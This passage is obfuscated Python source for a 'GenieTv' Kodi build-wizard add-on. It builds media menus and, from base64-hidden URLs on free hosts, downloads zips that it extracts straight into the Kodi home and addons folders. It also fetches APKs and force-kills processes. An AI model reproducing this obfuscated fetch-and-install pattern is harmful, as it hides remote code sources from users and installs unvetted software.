 if 17 - 17: Ooo0OO0oOO . OoO0O0 - OoOoOO00 + O0 / iIii1I11I1II1 / i11iIiiIii
 if 39 - 39: OoO0O0 * Oo + iIii1I11I1II1 - OoO0O0 + iii11
def o0iiiI1I1iIIIi1 ( ) :
 O0O0O ( )
 ooOooo000oOO ( '[COLORgreen]SEARCH MOVIES[/COLOR]' , iiI1IiI , 9001 , ii11iIi1I + 'MOVIESv.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( '[COLORgreen]SEARCH SERIES[/COLOR]' , iiI1IiI , 9002 , ii11iIi1I + 'TVSHOWSv.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( '[COLORgreen]SEARCH CARTOONS[/COLOR]' , '' , 10005 , ii11iIi1I + 'ORIGINCARTOON' , i1iiIII111ii , '' )
 if 17 - 17: iIii1I11I1II1 . OoooooooOO / Ooo0OO0oOO % OoOoOO00 % i1IIi / i11iIiiIii
 if 58 - 58: Oo . OoOoOO00 + OoIii111II - i11iIiiIii / OoOoOO00 / O0
 if 85 - 85: I1IiI + iii11
 if 10 - 10: OoO0O0 / Ooo00oOo00o + I1IiI / i1IIi
def i1iII1II11I ( ) :
 O0O0O ( )
 ooOooo000oOO ( '[COLORgreen]RADIO[/COLOR]' , iiI1IiI , 1013 , ii11iIi1I + 'radio.png' , i1iiIII111ii , '' )
 if o0oO0 . getSetting ( 'CONCERTS' ) == 'true' :
  ooOooo000oOO ( '[COLORgreen]CONCERTS[/COLOR]' , ( i1111 ( 'aHR0cHM6Ly93d3cucmVkZGl0LmNvbS9yL2Z1bGxjb25jZXJ0cy8=' ) ) , 7050 , ii11iIi1I + 'concerts.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( '[COLORgreen]MUSIC[/COLOR]' , iiI1IiI , 1030 , ii11iIi1I + 'MUSIC.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( '[COLORgreen]MUSIC ARCHIVE[/COLOR]' , iiI1IiI + ( i1111 ( 'L3ZvZC91cmxzL211c2ljLnBocA==' ) ) , 1010 , ii11iIi1I + 'MUSIC.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( '[COLORgreen]MUSIC SEARCH[/COLOR]' , iiI1IiI , 1111 , ii11iIi1I + 'search.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( '[COLORgreen]KODIBLE AUDIO BOOKS[/COLOR]' , 'http://doremisa.com/audiobooks/' , 30000 , ii11iIi1I + 'kodible.png' , i1iiIII111ii , '' )
 if 54 - 54: OoO0O0 + O0 + Ooo0OO0oOO * O0o0Ooo - iii11 % OoIii111II
 Oo0OoO00oOO0o ( 'movies' , 'MAIN' )
 if 13 - 13: o0Oo0O0Oo00oO / oo0OO * Ooo00oOo00o . Ooo00oOo00o * o0Oo0O0Oo00oO
def O00oO ( ) :
 O0O0O ( )
 if 40 - 40: I1IiI / OoO0O0
 Ii1iIiII1ii1 ( 'DELETE CACHE' , 'url' , 14 , ii11iIi1I + 'MAIN5.png' , i1iiIII111ii , '' )
 Ii1iIiII1ii1 ( 'DELETE PACKAGES' , 'url' , 6 , ii11iIi1I + 'MAIN4.png' , i1iiIII111ii , '' )
 Ii1iIiII1ii1 ( 'FORCE REFRESH' , 'url' , 10 , ii11iIi1I + 'MAIN3.png' , i1iiIII111ii , 'Force Refresh All Repos' )
 if 79 - 79: Ooo00oOo00o - iIii1I11I1II1 + ii11i1 - O0o0Ooo
 Ii1iIiII1ii1 ( 'CHECK MY IP' , 'url' , 12 , ii11iIi1I + 'MAIN2.png' , i1iiIII111ii , '' )
 Ii1iIiII1ii1 ( 'ANDROID ONLY DELETE TEXTURE13.DB&THUBMNAIL FOLDER' , 'url' , 13 , ii11iIi1I + 'MAIN1.png' , i1iiIII111ii , 'Only Works On Android On Windows It Deletes Your Thumnails Folder But Does Not Delete The Textures13.db' )
 ooOooo000oOO ( '[COLORgreen]ADVANCED SETTINGS XML[/COLOR]' , iiI1IiI , 4 , ii11iIi1I + 'XML.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( '[COLORgreen]URL FIXES[/COLOR]' , iiI1IiI , 20 , ii11iIi1I + 'URLFIX.png' , i1iiIII111ii , '' )
 Oo0OoO00oOO0o ( 'movies' , 'MAIN' )
 if 93 - 93: OoOoOO00 . OOOo0 - Oo + I1IiI
 if 61 - 61: OoOoOO00
def iI1Ii11111iIi ( ) :
 O0O0O ( )
 ooOooo000oOO ( '[COLORgreen]REPOS[/COLOR]' , ( i1111 ( 'aHR0cDovL21pcnJvcnMua29kaS50di9hZGRvbnMv' ) ) , 2030 , ii11iIi1I + 'repos.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( '[COLORgreen]NEW[/COLOR]' , iiI1IiI , 22 , ii11iIi1I + 'NEW.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( '[COLORgreen]IPTV[/COLOR]' , iiI1IiI , 23 , ii11iIi1I + 'IPTV.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( '[COLORgreen]VIDEO[/COLOR]' , iiI1IiI , 24 , ii11iIi1I + 'VIDEO.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( '[COLORgreen]SPORTS[/COLOR]' , iiI1IiI , 25 , ii11iIi1I + 'SPORTS.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( '[COLORgreen]KIDS[/COLOR]' , iiI1IiI , 26 , ii11iIi1I + 'KIDS.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( '[COLORgreen]MUSIC[/COLOR]' , iiI1IiI , 27 , ii11iIi1I + 'MUSIC.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( '[COLORgreen]PROGRAMS[/COLOR]' , iiI1IiI , 28 , ii11iIi1I + 'PROGRAMS.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( '[COLORgreen]XXX[/COLOR]' , 'URL' , 29 , ii11iIi1I + 'XXX.png' , i1iiIII111ii , '' )
 Oo0OoO00oOO0o ( 'movies' , 'MAIN' )
 if 15 - 15: i11iIiiIii % OOOo0 * Ooo0OO0oOO / O0o0Ooo
 if 90 - 90: oo0OO
def i1i1i1I ( ) :
 O0O0O ( )
 Ii1iIiII1ii1 ( 'CHECK ADVANCED XML' , iiI1IiI , 8 , ii11iIi1I + 'XML.png' , i1iiIII111ii , '' )
 Ii1iIiII1ii1 ( 'MUCKYS XML' , iiI1IiI + '/wizard/muckys.xml' , 7 , ii11iIi1I + 'XML.png' , i1iiIII111ii , '' )
 Ii1iIiII1ii1 ( '0CACHE XML' , iiI1IiI + '/wizard/0cache.xml' , 7 , ii11iIi1I + 'XML.png' , i1iiIII111ii , '' )
 Ii1iIiII1ii1 ( 'MIKEY1234 XML' , iiI1IiI + '/wizard/mikey.xml' , 7 , ii11iIi1I + 'XML.png' , i1iiIII111ii , '' )
 Ii1iIiII1ii1 ( 'TUXENS XML' , iiI1IiI + '/wizard/tuxens.xml' , 7 , ii11iIi1I + 'XML.png' , i1iiIII111ii , '' )
 Ii1iIiII1ii1 ( 'P2P RECOMMENDED XML1' , iiI1IiI + '/wizard/p2p1.xml' , 7 , ii11iIi1I + 'XML.png' , i1iiIII111ii , '' )
 Ii1iIiII1ii1 ( 'P2P RECOMMENDED XML2' , iiI1IiI + '/wizard/p2p2.xml' , 7 , ii11iIi1I + 'XML.png' , i1iiIII111ii , '' )
 Ii1iIiII1ii1 ( 'DELETE XML' , iiI1IiI , 11 , ii11iIi1I + 'XML.png' , i1iiIII111ii , '' )
 Oo0OoO00oOO0o ( 'movies' , 'MAIN' )
 if 83 - 83: OoIii111II + OoooooooOO
def I111IiiIi1 ( ) :
 O0O0O ( )
 Ii1iIiII1ii1 ( '[COLORgreen]My Local Zip[/COLOR]' , I11 , 48 , ii11iIi1I + 'MB.png' , i1iiIII111ii , '' )
 Ii1iIiII1ii1 ( '[COLORgreen]My Online Zip[/COLOR]' , i11 , 43 , ii11iIi1I + 'MB.png' , i1iiIII111ii , '' )
 if 88 - 88: OoooooooOO
def OO00 ( ) :
 O0O0O ( )
 Ii1iIiII1ii1 ( 'INSTALL FTV GUIDE AND OTHER ADDONS REQUIRED' , iiI1IiI + '/wizard/customftv/ftvguide-addons.zip' , 5 , ii11iIi1I + 'FTV4.png' , i1iiIII111ii , '' )
 Ii1iIiII1ii1 ( 'FTV GUIDE FIRST RUN SETTINGS' , iiI1IiI + '/wizard/customftv/settings.xml' , 17 , ii11iIi1I + 'FTV3.png' , i1iiIII111ii , '' )
 Ii1iIiII1ii1 ( 'FTV GUIDE ADDONS2.INI UPDATE DAILY' , 'http://ren.byethost12.com/addons2.ini' , 16 , ii11iIi1I + 'FTV1.png' , i1iiIII111ii , '' )
 Ii1iIiII1ii1 ( 'RESET FTV DATABASE' , 'url' , 18 , ii11iIi1I + 'FTV2.png' , i1iiIII111ii , '' )
 if 28 - 28: OoIii111II - i11iIiiIii . ii11ii1ii + OoO0O0 / ii11ii1ii
 if 35 - 35: OoO0O0
 if 75 - 75: Oo / ii11ii1ii . OoO0O0 * iii11 - OoOoOO00
def i1i1IIii1i1 ( ) :
 O0O0O ( )
 ooOooo000oOO ( '[COLORgreen]SKINS[/COLOR]' , iiI1IiI , 33 , ii11iIi1I + 'skinp.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( '[COLORgreen]ARTWORK PACKS[/COLOR]' , iiI1IiI , 34 , ii11iIi1I + 'artp.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( '[COLORgreen]CREATE UNIVERSAL PATHS[/COLOR]' , oooOOOOO , 35 , ii11iIi1I + 'GUI.png' , i1iiIII111ii , '' )
 Oo0OoO00oOO0o ( 'movies' , 'MAIN' )
 if 65 - 65: OOOo0 + I1IiI / iii11
def oOO ( url ) :
 oOooo0O0o = ooOOO0 ( Oo000 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 o0o = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( oOooo0O0o )
 for OO , url , IIii1111 , I1iI , iI1i111I1Ii in o0o :
  ooOooo000oOO ( OO , url , 5 , IIii1111 , I1iI , iI1i111I1Ii )
 Oo0OoO00oOO0o ( 'movies' , 'MAIN' )
 if 81 - 81: iii11 - iii11 % OoOoOO00 * Ooo00oOo00o
def iIi1iI111I ( ) :
 O0O0O ( )
 ooOooo000oOO ( '[COLORgreen]GOTHAM SKINS[/COLOR]' , iiI1IiI , 36 , ii11iIi1I + 'GSKIN.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( '[COLORgreen]HELIX SKINS[/COLOR]' , iiI1IiI , 37 , ii11iIi1I + 'HSKIN.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( '[COLORgreen]ISENGAARD SKINS[/COLOR]' , oooOOOOO , 38 , ii11iIi1I + 'ISKIN.png' , i1iiIII111ii , '' )
 Oo0OoO00oOO0o ( 'movies' , 'MAIN' )
 if 85 - 85: OoooooooOO * iIii1I11I1II1 . oo0OO / OoooooooOO % OOOo0 % O0
def I1iii ( url ) :
 oOooo0O0o = ooOOO0 ( iiI1IiI + oO0o0O0Ooo0o ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 o0o = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( oOooo0O0o )
 for OO , url , IIii1111 , I1iI , iI1i111I1Ii in o0o :
  ooOooo000oOO ( OO , url , 42 , IIii1111 , I1iI , iI1i111I1Ii )
 Oo0OoO00oOO0o ( 'movies' , 'MAIN' )
 if 21 - 21: O0o0Ooo - OOOo0 + Ooo0OO0oOO
def ooOoo0o0O ( url ) :
 oOooo0O0o = ooOOO0 ( iiI1IiI + oOO0OooOo ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 o0o = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( oOooo0O0o )
 for OO , url , IIii1111 , I1iI , iI1i111I1Ii in o0o :
  ooOooo000oOO ( OO , url , 42 , IIii1111 , I1iI , iI1i111I1Ii )
 Oo0OoO00oOO0o ( 'movies' , 'MAIN' )
 if 33 - 33: iii11 / i1IIi - OOOo0 % Oo . ii11ii1ii
def Ii1II ( url ) :
 oOooo0O0o = ooOOO0 ( iiI1IiI + O0Oo00 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 o0o = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( oOooo0O0o )
 for OO , url , IIii1111 , I1iI , iI1i111I1Ii in o0o :
  ooOooo000oOO ( OO , url , 42 , IIii1111 , I1iI , iI1i111I1Ii )
 Oo0OoO00oOO0o ( 'movies' , 'MAIN' )
 if 41 - 41: iIii1I11I1II1 % Ooo0OO0oOO
def oOo0oO ( url ) :
 oOooo0O0o = ooOOO0 ( i1111 ( 'aHR0cHM6Ly9kbC5kcm9wYm94dXNlcmNvbnRlbnQuY29tL3MvN2ZrMjhndDlwb3QxMjJhL0JVSUxEUy50eHQ/ZGw9MA==' ) ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 o0o = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( oOooo0O0o )
 for OO , url , IIii1111 , I1iI , iI1i111I1Ii in o0o :
  ooOooo000oOO ( OO , url , 42 , IIii1111 , I1iI , iI1i111I1Ii )
 Oo0OoO00oOO0o ( 'movies' , 'MAIN' )
 if 5 - 5: iii11 - iii11 . Oo + I1IiI - iii11 . OoIii111II
def IiIi1i1ii ( url ) :
 oOooo0O0o = ooOOO0 ( iiI1IiI + iiIi ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 o0o = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( oOooo0O0o )
 for OO , url , IIii1111 , I1iI , iI1i111I1Ii in o0o :
  ooOooo000oOO ( OO , url , 40 , IIii1111 , I1iI , iI1i111I1Ii )
 Oo0OoO00oOO0o ( 'movies' , 'MAIN' )
 if 71 - 71: I1IiI . i1IIi
def o0OooO0ooo0o ( url ) :
 oOooo0O0o = ooOOO0 ( iiI1IiI + iii1 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 o0o = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( oOooo0O0o )
 for OO , url , IIii1111 , I1iI , iI1i111I1Ii in o0o :
  ooOooo000oOO ( OO , url , 5 , IIii1111 , I1iI , iI1i111I1Ii )
 Oo0OoO00oOO0o ( 'movies' , 'MAIN' )
 if 32 - 32: ii11i1 . OoO0O0 . OoooooooOO - Ooo00oOo00o + OoIii111II
def ooO0oO00O0o ( ) :
 iIIiiI1II1i11 = o0o0 ( i1111 ( 'aHR0cDovL2FyY2hpdGVjdHMueDEwaG9zdC5jb20vYXBrdG9vbC9hcGsucGhw' ) )
 o0o = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /></a><br><b>(.+?)</b>' ) . findall ( iIIiiI1II1i11 )
 for iI1i11 , iiI1IIIi , OO in o0o :
  ooOO00oOOo000 ( OO , iI1i11 , 2031 , iiI1IIIi )
  if 14 - 14: Ooo00oOo00o . OoOoOO00 . Ooo0OO0oOO / ii11i1 % ii11ii1ii - o0Oo0O0Oo00oO
def o0oOoO0O ( name , url , description ) :
 OO0O00oOo = xbmc . translatePath ( os . path . join ( OoOo000oOo0oo , 'Download' ) )
 Oo0oO0ooo = xbmcgui . DialogProgress ( )
 Oo0oO0ooo . create ( "Your App Is Downloading" , "Why not check out our website" , '' , 'Http://architects.x10host.com' )
 oO0O = os . path . join ( OO0O00oOo , name + '.apk' )
 try :
  os . remove ( oO0O )
 except :
  pass
 downloader . download ( url , oO0O , Oo0oO0ooo )
 i1iiIIiiI111 = xbmcgui . Dialog ( )
 i1iiIIiiI111 . ok ( "GenieTv" , "[COLORred]Please press ok, exit kodi and go to your downloads folder to install your app[/COLOR]" , "[COLORblue]Tool Brought To You By Architects@Work[/COLOR]" )
 if 86 - 86: I1IiI . iIii1I11I1II1 - Ooo00oOo00o
def oOOI11I ( url ) :
 OO0O00oOo = xbmc . translatePath ( os . path . join ( 'special://home/addons/plugin.video.GenieTv/resources/downloads' ) )
 Oo0oO0ooo = xbmcgui . DialogProgress ( )
 Oo0oO0ooo . create ( "Your fILM Is Downloading" , "Why not check out our website" , '' , 'Http://architects.x10host.com' )
 oO0O = os . path . join ( OO0O00oOo , OO + '.mp4' )
 try :
  os . remove ( oO0O )
 except :
  pass
 downloader . download ( url , oO0O , Oo0oO0ooo )
 i1iiIIiiI111 = xbmcgui . Dialog ( )
 i1iiIIiiI111 . ok ( "GenieTv" , "[COLORred]Please press ok, Your download With Be Avaiilable Via The My Downloads Button[/COLOR]" , "[COLORblue]Tool Brought To You By Architects@Work[/COLOR]" )
 if 6 - 6: ii11ii1ii + OoIii111II
 if 48 - 48: iIii1I11I1II1 % i1IIi % oo0OO + o0Oo0O0Oo00oO
def Iiii11iIi1 ( name , url , description ) :
 OO0O00oOo = xbmc . translatePath ( os . path . join ( 'special://home/addons' , 'packages' ) )
 Oo0oO0ooo = xbmcgui . DialogProgress ( )
 Oo0oO0ooo . create ( "Your Art Pack Is Downloading" , "Why not check out our website" , '' , 'Http://architects.x10host.com' )
 oO0O = os . path . join ( OO0O00oOo , name )
 try :
  os . remove ( oO0O )
 except :
  pass
 downloader . download ( url , oO0O , Oo0oO0ooo )
 i1iI11I1II1 = xbmc . translatePath ( os . path . join ( oo00 ) )
 time . sleep ( 2 )
 Oo0oO0ooo . update ( 0 , "" , "Placing Your Art Please Wait" )
 print '======================================='
 print i1iI11I1II1
 print '======================================='
 extract . all ( oO0O , i1iI11I1II1 , Oo0oO0ooo )
 i1iiIIiiI111 = xbmcgui . Dialog ( )
 i1iiIIiiI111 . ok ( "GenieTv" , "[COLORred]Once complete your artwork will be stored in your Media folder, Accessible via the Homefolder, Enjoy[/COLOR]" )
 if 14 - 14: i11iIiiIii - oo0OO * I1IiI
 if 51 - 51: ii11ii1ii / iIii1I11I1II1 % OoIii111II + OOooOOo * o0Oo0O0Oo00oO + O0o0Ooo
def o0OoO00o0000O ( url ) :
 oOooo0O0o = ooOOO0 ( i1111 ( 'aHR0cDovL2dlbmlldHYuYXJjaGl0ZWN0cy54MTBob3N0LmNvbS90ZXN0L3doLnR4dA==' ) ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 o0o = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( oOooo0O0o )
 for OO , url , IIii1111 , I1iI , iI1i111I1Ii in o0o :
  ooOooo000oOO ( OO , url , 5 , IIii1111 , I1iI , iI1i111I1Ii )
 try :
  oOooo0O0o = ooOOO0 ( II11I + oO0o0o0ooO0oO + OooOOO0O00 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
  o0o = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( oOooo0O0o )
  for OO , url , IIii1111 , I1iI , iI1i111I1Ii in o0o :
   ooOooo000oOO ( OO , url , 5 , IIii1111 , I1iI , iI1i111I1Ii )
 except : pass
 Oo0OoO00oOO0o ( 'movies' , 'INFO' )
 if 29 - 29: OOooOOo % iIii1I11I1II1 . OoooooooOO % OoooooooOO % OoOoOO00 / oo0OO
 if 70 - 70: i11iIiiIii % oo0OO
def I11Ii11iI1 ( url ) :
 oOooo0O0o = ooOOO0 ( i1111 ( 'aHR0cDovL2dlbmlldHYuYXJjaGl0ZWN0cy54MTBob3N0LmNvbS90ZXN0L3doLnR4dA==' ) ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 o0o = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( oOooo0O0o )
 for OO , url , IIii1111 , I1iI , iI1i111I1Ii in o0o :
  ooOooo000oOO ( OO , url , 43 , IIii1111 , I1iI , iI1i111I1Ii )
 try :
  oOooo0O0o = ooOOO0 ( II11I + oO0o0o0ooO0oO + OooOOO0O00 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
  o0o = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( oOooo0O0o )
  for OO , url , IIii1111 , I1iI , iI1i111I1Ii in o0o :
   ooOooo000oOO ( OO , url , 43 , IIii1111 , I1iI , iI1i111I1Ii )
 except : pass
 Oo0OoO00oOO0o ( 'movies' , 'INFO' )
 if 39 - 39: OOOo0 * i11iIiiIii - OoIii111II / OoO0O0 % O0o0Ooo % Ooo0OO0oOO
 if 65 - 65: OoIii111II - o0Oo0O0Oo00oO % OoooooooOO / OoooooooOO % OoooooooOO
def oOoOoo0 ( name , url , description ) :
 OO0O00oOo = xbmc . translatePath ( os . path . join ( 'special://home/addons' , 'packages' ) )
 Oo0oO0ooo = xbmcgui . DialogProgress ( )
 Oo0oO0ooo . create ( "GenieTv" , "Downloading Content" , '' , 'Please Wait' )
 oO0O = os . path . join ( OO0O00oOo , name + '.zip' )
 try :
  os . remove ( oO0O )
 except :
  pass
 downloader . download ( url , oO0O , Oo0oO0ooo )
 ii1II = xbmc . translatePath ( os . path . join ( 'special://home' , 'addons' ) )
 time . sleep ( 2 )
 Oo0oO0ooo . update ( 0 , "" , "Extracting Zip Please Wait" )
 print '======================================='
 print ii1II
 print '======================================='
 extract . all ( oO0O , ii1II , Oo0oO0ooo )
 i1iiIIiiI111 = xbmcgui . Dialog ( )
 i1iiIIiiI111 . ok ( "GenieTv" , "Press ok to finish install" , "[COLOR yellow]Brought To You By Architects@Work[/COLOR]" )
 iI111i ( )
 if 50 - 50: ii11i1 + i1IIi / O0 / OOooOOo
 if 42 - 42: i1IIi . OOOo0 / i1IIi + ii11i1
def O0o0O0OO00o ( name , url , description ) :
 OO0O00oOo = xbmc . translatePath ( os . path . join ( 'special://home/addons' , 'packages' ) )
 Oo0oO0ooo = xbmcgui . DialogProgress ( )
 Oo0oO0ooo . create ( "GenieTv" , "Downloading " , '' , 'Please Wait' )
 oO0O = os . path . join ( OO0O00oOo , 'plugin.program.GenieTv.install' + '.zip' )
 try :
  os . remove ( oO0O )
 except :
  pass
 downloader . download ( url , oO0O , Oo0oO0ooo )
 ii1II = xbmc . translatePath ( os . path . join ( 'special://' , 'home' ) )
 time . sleep ( 2 )
 Oo0oO0ooo . update ( 0 , "" , "Extracting Zip Please Wait" )
 print '======================================='
 print ii1II
 print '======================================='
 extract . all ( oO0O , ii1II , Oo0oO0ooo )
 i1iiIIiiI111 = xbmcgui . Dialog ( )
 i1iiIIiiI111 . ok ( "GenieTv" , "Press ok to force close kodi, if unsuccessful using windows Please kill kodi via taskmanager" , "[COLOR yellow]Brought To You By Architects@Work[/COLOR]" )
 OOo00O ( )
 if 81 - 81: OoO0O0 . OOooOOo / O0o0Ooo
def Iii111Ii ( name , url , description ) :
 OO0O00oOo = xbmc . translatePath ( os . path . join ( 'special://home/addons' , 'packages' ) )
 Oo0oO0ooo = xbmcgui . DialogProgress ( )
 Oo0oO0ooo . create ( "GenieTv" , "Downloading " , '' , 'Please Wait' )
 oO0O = os . path . join ( OO0O00oOo , 'plugin.program.GenieTv.install' + '.zip' )
 try :
  os . remove ( oO0O )
 except :
  pass
 downloader . download ( url , oO0O , Oo0oO0ooo )
 ii1II = xbmc . translatePath ( os . path . join ( 'special://' , 'home' ) )
 time . sleep ( 2 )
 Oo0oO0ooo . update ( 0 , "" , "Extracting Zip Please Wait" )
 print '======================================='
 print ii1II
 print '======================================='
 extract . all ( oO0O , ii1II , Oo0oO0ooo )
 i1iiIIiiI111 = xbmcgui . Dialog ( )
 i1iiIIiiI111 . ok ( "GenieTv" , "Please Disconnect The Power From Your Device. DO NOT EXIT CLEANLY VIA SHUTDOWN" , "[COLOR yellow]Brought To You By Architects@Work[/COLOR]" )
 if 54 - 54: ii11i1 * O0o0Ooo - OoooooooOO % OOOo0 + O0
 if 6 - 6: ii11ii1ii - OoOoOO00 / OoIii111II + i11iIiiIii + iii11
def O0O0o0o0o ( name , url , description ) :
 ii1II = xbmc . translatePath ( os . path . join ( 'special://' , 'home' ) )
 Oo0oO0ooo = xbmcgui . DialogProgress ( )
 oO0O = os . path . join ( I11 )
 time . sleep ( 2 )
 Oo0oO0ooo . create ( "GenieTv" , "Restoring" , '' , 'Please Wait' )
 print '======================================='
 print ii1II
 print '======================================='
 extract . all ( oO0O , ii1II , Oo0oO0ooo )
 i1iiIIiiI111 = xbmcgui . Dialog ( )
 i1iiIIiiI111 . ok ( "GenieTv" , "Please Disconnect The Power From Your Device. DO NOT EXIT CLEANLY VIA SHUTDOWN" , "[COLOR yellow]Brought To You By Architects@Work[/COLOR]" )
 if 9 - 9: Oo + I1IiI - iIii1I11I1II1 - ii11i1 + OOooOOo
 if 97 - 97: iii11
def OOo00O ( ) :
 OO0OOooOO0 = xbmcgui . Dialog ( ) . yesno ( 'Force Close Kodi' , 'You are about to close Kodi' , 'Would you like to continue?' , nolabel = 'No, Cancel' , yeslabel = 'Yes, Close' )
 if OO0OOooOO0 == 0 :
  return
 elif OO0OOooOO0 == 1 :
  pass
 IIIIIii1ii11 = OOOooo0OooOoO ( )
 print "Platform: " + str ( IIIIIii1ii11 )
 if IIIIIii1ii11 == 'osx' :
  print "############   try osx force close  #################"
  try : os . system ( 'killall -9 XBMC' )
  except : pass
  try : os . system ( 'killall -9 Kodi' )
  except : pass
  i1iiIIiiI111 . ok ( "[COLOR=red][B]WARNING  !!![/COLOR][/B]" , "If you\'re seeing this message it means the force close" , "was unsuccessful. Please force close XBMC/Kodi [COLOR=lime]DO NOT[/COLOR] exit cleanly via the menu." , '' )
 elif IIIIIii1ii11 == 'linux' :
  print "############   try linux force close  #################"
  try : os . system ( 'killall XBMC' )
  except : pass
  try : os . system ( 'killall Kodi' )
  except : pass
  try : os . system ( 'killall -9 xbmc.bin' )
  except : pass
  try : os . system ( 'killall -9 kodi.bin' )
  except : pass
  i1iiIIiiI111 . ok ( "[COLOR=red][B]WARNING  !!![/COLOR][/B]" , "If you\'re seeing this message it means the force close" , "was unsuccessful. Please force close XBMC/Kodi [COLOR=lime]DO NOT[/COLOR] exit cleanly via the menu." , '' )
 elif IIIIIii1ii11 == 'android' :
  print "############   try android force close  #################"
  try : os . system ( 'adb shell am force-stop org.xbmc.kodi' )
  except : pass
  try : os . system ( 'adb shell am force-stop org.kodi' )
  except : pass
  try : os . system ( 'adb shell am force-stop org.xbmc.xbmc' )
  except : pass
  try : os . system ( 'adb shell am force-stop org.xbmc' )
  except : pass
  i1iiIIiiI111 . ok ( "[COLOR=red][B]WARNING  !!![/COLOR][/B]" , "Your system has been detected as Android, you " , "[COLOR=yellow][B]MUST[/COLOR][/B] force close XBMC/Kodi. [COLOR=lime]DO NOT[/COLOR] exit cleanly via the menu." , "Pulling the power cable is the simplest method to force close." )
 elif IIIIIii1ii11 == 'windows' :
  print "############   try windows force close  #################"
  try :
   os . system ( '@ECHO off' )
   os . system ( 'tskill XBMC.exe' )
  except : pass
  try :
   os . system ( '@ECHO off' )
   os . system ( 'tskill Kodi.exe' )
  except : pass
  try :
   os . system ( '@ECHO off' )
   os . system ( 'TASKKILL /im Kodi.exe /f' )
  except : pass
  try :
   os . system ( '@ECHO off' )
   os . system ( 'TASKKILL /im XBMC.exe /f' )
  except : pass
  i1iiIIiiI111 . ok ( "[COLOR=red][B]WARNING  !!![/COLOR][/B]" , "If you\'re seeing this message it means the force close" , "was unsuccessful. Please force close XBMC/Kodi [COLOR=lime]DO NOT[/COLOR] exit cleanly via the menu." , "Use task manager and NOT ALT F4" )
 else :
  print "############   try atv force close  #################"
  try : os . system ( 'killall AppleTV' )
  except : pass
  print "############   try raspbmc force close  #################"
  try : os . system ( 'sudo initctl stop kodi' )
  except : pass
  try : os . system ( 'sudo initctl stop xbmc' )
  except : pass
  i1iiIIiiI111 . ok ( "[COLOR=red][B]WARNING  !!![/COLOR][/B]" , "If you\'re seeing this message it means the force close" , "was unsuccessful. Please force close XBMC/Kodi [COLOR=lime]DO NOT[/COLOR] exit via the menu." , "Your platform could not be detected so just pull the power cable." )
  if 91 - 91: OoIii111II + OOOo0
def OOOooo0OooOoO ( ) :
 if xbmc . getCondVisibility ( 'system.platform.android' ) :
  return 'android'
 elif xbmc . getCondVisibility ( 'system.platform.linux' ) :
  return 'linux'
 elif xbmc . getCondVisibility ( 'system.platform.windows' ) :
  return 'windows'
 elif xbmc . getCondVisibility ( 'system.platform.osx' ) :
  return 'osx'
 elif xbmc . getCondVisibility ( 'system.platform.atv2' ) :
  return 'atv2'
 elif xbmc . getCondVisibility ( 'system.platform.ios' ) :
  return 'ios'
  if 59 - 59: OOOo0 + i11iIiiIii + i1IIi / Ooo0OO0oOO
  if 44 - 44: Ooo0OO0oOO . I1IiI * OOOo0 + OoooooooOO - oo0OO - OoO0O0
  if 15 - 15: OoO0O0 / O0 . OOooOOo . i11iIiiIii
def o0OO0O0Oo ( url ) :
 Oo0oO0ooo . create ( "[COLOR=green]GenieTv[/COLOR]" , "Renaming paths..." , '' , 'Please Wait' )
 for OOOOO , IiiIiI1Ii1i , i1iIiiiiii1II in os . walk ( url ) :
  for file in i1iIiiiiii1II :
   if file . endswith ( ".xml" ) :
    Oo0oO0ooo . update ( 0 , "Fixing" , file , 'Please Wait' )
